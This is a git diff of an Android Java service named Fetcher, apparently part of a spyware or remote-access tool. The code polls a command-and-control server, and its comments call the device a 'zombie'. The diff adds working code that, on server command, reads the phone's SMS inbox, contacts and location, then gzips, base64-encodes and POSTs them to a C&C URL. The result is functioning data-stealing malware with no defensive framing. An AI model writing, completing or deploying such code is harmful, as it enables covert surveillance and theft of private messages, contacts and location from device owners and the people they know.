@@ -1,5 +1,6 @@
 package com.app.checker;
 
+import android.Manifest;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -17,10 +18,21 @@ import android.os.AsyncTask;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.provider.ContactsContract;
+import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
+import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+import com.android.volley.NetworkResponse;
+import com.android.volley.Request;
+import com.android.volley.RequestQueue;
+import com.android.volley.Response;
+import com.android.volley.VolleyError;
+import com.android.volley.VolleyLog;
+import com.android.volley.toolbox.HttpHeaderParser;
+import com.android.volley.toolbox.StringRequest;
+import com.android.volley.toolbox.Volley;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import com.google.android.gms.tasks.OnFailureListener;
@@ -28,6 +40,7 @@ import com.google.android.gms.tasks.OnSuccessListener;
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -38,14 +51,9 @@ import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.TimeZone;
 import java.util.UUID;
+import java.util.zip.GZIPOutputStream;
 
 public class Fetcher extends Service {
-
-    final String SERVER_IP = "192.168.0.103"; // C&C Server
-    final int SERVER_PORT = 80;
-    final String FILE_NAME = "data";
-    final String FULL_URL = "http://" + SERVER_IP + ":" + SERVER_PORT + "/" + FILE_NAME;
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 
@@ -61,14 +69,13 @@ public class Fetcher extends Service {
 
         try {
             if (isConnected()) { // Check if device has a network connection
-                new JsonTask().execute(FULL_URL + "?id=" + id);
+                new JsonTask().execute(getString(R.string.cc_json) + "?id=" + id);
             } else {
                 Toast.makeText(getApplicationContext(), "No network connection", Toast.LENGTH_LONG).show();
             }
         } catch (Exception e) {
             e.printStackTrace();
         }
-
         return Service.START_NOT_STICKY;
     }
 
@@ -135,10 +142,11 @@ public class Fetcher extends Service {
                 try {
                     JSONObject json = new JSONObject(result);
                     String task = json.getString("task");
-                    String machineID = json.getString("uuid");
+                    String zombieID = json.getString("uuid");
                     SharedPreferences sPrefs = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
-                    final String id = sPrefs.getString("uuid", null);
-                    //if(machineID.equals(id)){
+                    final String uuid = sPrefs.getString("uuid", null);
+
+                    //if(zombieID.equals(uuid)){
                     if (task.equals("kill")) {
                         AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
                         Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
@@ -149,22 +157,19 @@ public class Fetcher extends Service {
                         stopSelf();
                     } else if (task.equals("smsDump")) {
                         if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
-                            ArrayList<String> sms = fetchInbox();
-                            Toast.makeText(getApplicationContext(), String.valueOf(sms.size()), Toast.LENGTH_SHORT).show();
-                            for (int i = 0; i < sms.size(); i++) {
-                                Toast.makeText(getApplicationContext(), sms.get(i), Toast.LENGTH_LONG).show();
-                            }
-                            //sendData();
+                            sendData(task, uuid, fetchInbox());
+                        } else {
+                            Toast.makeText(getApplicationContext(), "No SMS permission", Toast.LENGTH_LONG).show();
                         }
-                    } else if (task.equals("getGeoLocation")) {
-                        getLastLocation();
                     } else if (task.equals("contactsDump")) {
                         if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED) {
-                            ArrayList<String> contactInfo = fetchContacts();
-                            Toast.makeText(getApplicationContext(), String.valueOf(contactInfo.size()), Toast.LENGTH_SHORT).show();
-                            for (int i = 0; i < contactInfo.size(); i++) {
-                                Toast.makeText(getApplicationContext(), contactInfo.get(i), Toast.LENGTH_LONG).show();
-                            }
+                            sendData(task, uuid, fetchContacts());
+                        }
+                    } else if (task.equals("getGeoLocation")) {
+                        if (ActivityCompat.checkSelfPermission(getBaseContext(), Manifest.permission.ACCESS_FINE_LOCATION)
+                                == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION)
+                                == PackageManager.PERMISSION_GRANTED) {
+                            sendData(task, uuid, getLastLocation());
                         }
                     }
                     //} else {
@@ -172,14 +177,12 @@ public class Fetcher extends Service {
                     //}
 
                 } catch (JSONException e) {
-                    Log.e("Error", e.getMessage());
+                    e.printStackTrace();
                 }
             } else {
                 Toast.makeText(getApplicationContext(), "Server not reachable", Toast.LENGTH_LONG).show();
             }
         }
-
-
     }
 
     public boolean isConnected() {
@@ -199,7 +202,7 @@ public class Fetcher extends Service {
     }
 
     // Method to dump SMS messages
-    public ArrayList<String> fetchInbox() {
+    private ArrayList<String> fetchInbox() {
         ArrayList<String> sms = new ArrayList<>();
         Uri uri = Uri.parse("content://sms/");
         Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, "_id > 3", null, "date DESC");
@@ -211,23 +214,25 @@ public class Fetcher extends Service {
                 Long dateMil = cursor.getLong(2);
                 String body = cursor.getString(3);
                 Date date = new Date(dateMil);
-                SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
+                SimpleDateFormat formatter = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault());
                 formatter.setTimeZone(TimeZone.getTimeZone("UTC"));
                 String formatted = formatter.format(date);
-                sms.add("ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body);
+                sms.add("\n ID=>" + id + "\n Address=>" + address + "\n Date=>" + formatted + "\n Body=>" + body + "\n");
                 cursor.moveToNext();
             }
+            cursor.close();
         }
         return sms;
     }
 
+    // Method to dump phone contacts
     private ArrayList<String> fetchContacts() {
         ArrayList<String> info = new ArrayList<>();
         ContentResolver cr = getContentResolver();
         Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
 
         if ((cursor != null ? cursor.getCount() : 0) > 0) {
-            while (cursor != null && cursor.moveToNext()) {
+            while (cursor.moveToNext()) {
                 String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                 String name = cursor.getString(cursor.getColumnIndex((ContactsContract.Contacts.DISPLAY_NAME)));
 
@@ -237,33 +242,27 @@ public class Fetcher extends Service {
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                             ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null
                     );
-                    while (pCur.moveToNext()) {
-                        String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        info.add("ID=>" + id + "\nName=>" + name + "\nPhone Number" + phoneNumber);
-                    }
 
+                    if (pCur != null) {
+                        while (pCur.moveToNext()) {
+                            String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            info.add("\n ID=>" + id + "\nName=>" + name + "\nPhone Number" + phoneNumber + "\n");
+                        }
+                        pCur.close();
+                    }
                 }
             }
-//            cursor.moveToFirst();
-//            for (int i=0;i<cursor.getCount();i++){
-//                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-//                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
-//                if(cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))>0){
-//                    Cursor numberCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
-//                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id},null);
-//                    String phoneNumber = numberCursor.getString(numberCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-//                    info.add("ID=>"+id+"\nName=>"+name+"\nPhone Number"+phoneNumber);
-//                }
-//            }
-        }
-        if (cursor != null)
             cursor.close();
+        }
         return info;
     }
 
     // Method to retrieve geographical location
-    private void getLastLocation() {
+    ArrayList<String> geoLocation = new ArrayList<>();
+
+    private ArrayList<String> getLastLocation() {
         FusedLocationProviderClient mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+
         try {
             mFusedLocationClient.getLastLocation().addOnSuccessListener(new OnSuccessListener<Location>() {
                 @Override
@@ -271,9 +270,10 @@ public class Fetcher extends Service {
                     if (location != null) {
                         double latitude = location.getLatitude();
                         double longitude = location.getLongitude();
-                        Toast.makeText(getApplicationContext(), String.valueOf(latitude) + "/" + String.valueOf(longitude), Toast.LENGTH_LONG).show();
+                        geoLocation.add("\nLatitude =>" + latitude + "\n Longitude =>" + longitude);
+
                     } else {
-                        Toast.makeText(getApplicationContext(), "Cannot get location", Toast.LENGTH_LONG).show();
+                        geoLocation.add("N/A");
                     }
                 }
             })
@@ -287,15 +287,69 @@ public class Fetcher extends Service {
         } catch (SecurityException e) {
             Log.d("LocationFetch", "Permission missing");
         }
+        return geoLocation;
     }
 
     // Send data to C&C
-//    private void sendData() throws IOException {
-//        URL url = new URL(FULL_URL);
-//        HttpURLConnection httpCon = (HttpURLConnection)url.openConnection();
-//        httpCon.setDoOutput(true);
-//        httpCon.setRequestMethod("PUT");
-//        OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());
-//        httpCon.getInputStream();
-//    }
+    public void sendData(String task, String uuid, ArrayList requestBody) {
+        try {
+            RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
+            String URL = getString(R.string.cc_php);
+            String initial = String.valueOf(requestBody);
+            final byte[] gzip = compress(initial);
+            final String base64 = Base64.encodeToString(gzip, Base64.DEFAULT);
+            final String data = "task= " + task + "&uuid=" + uuid + "&data=" + base64;
+
+            StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
+                @Override
+                public void onResponse(String response) {
+                    Log.i("VOLLEY", response);
+                }
+            }, new Response.ErrorListener() {
+                @Override
+                public void onErrorResponse(VolleyError error) {
+                    Log.e("VOLLEY", error.toString());
+                }
+            }) {
+                @Override
+                public String getBodyContentType() {
+                    return "application/x-www-form-urlencoded; charset=utf-8";
+                }
+
+                @Override
+                public byte[] getBody() {
+                    try {
+                        return data.getBytes();
+                    } catch (Exception uee) {
+                        VolleyLog.wtf("Unsupported Encoding while trying to get the bytes of %s using %s", data, "utf-8");
+                        return null;
+                    }
+                }
+
+                @Override
+                protected Response<String> parseNetworkResponse(NetworkResponse response) {
+                    String responseString = "";
+                    if (response != null) {
+                        responseString = String.valueOf(response.statusCode);
+                        // can get more details such as response.headers
+                    }
+                    return Response.success(responseString, HttpHeaderParser.parseCacheHeaders(response));
+                }
+            };
+
+            requestQueue.add(stringRequest);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static byte[] compress(String string) throws IOException {
+        ByteArrayOutputStream os = new ByteArrayOutputStream(string.length());
+        GZIPOutputStream gos = new GZIPOutputStream(os);
+        gos.write(string.getBytes());
+        gos.close();
+        byte[] compressed = os.toByteArray();
+        os.close();
+        return compressed;
+    }
 }
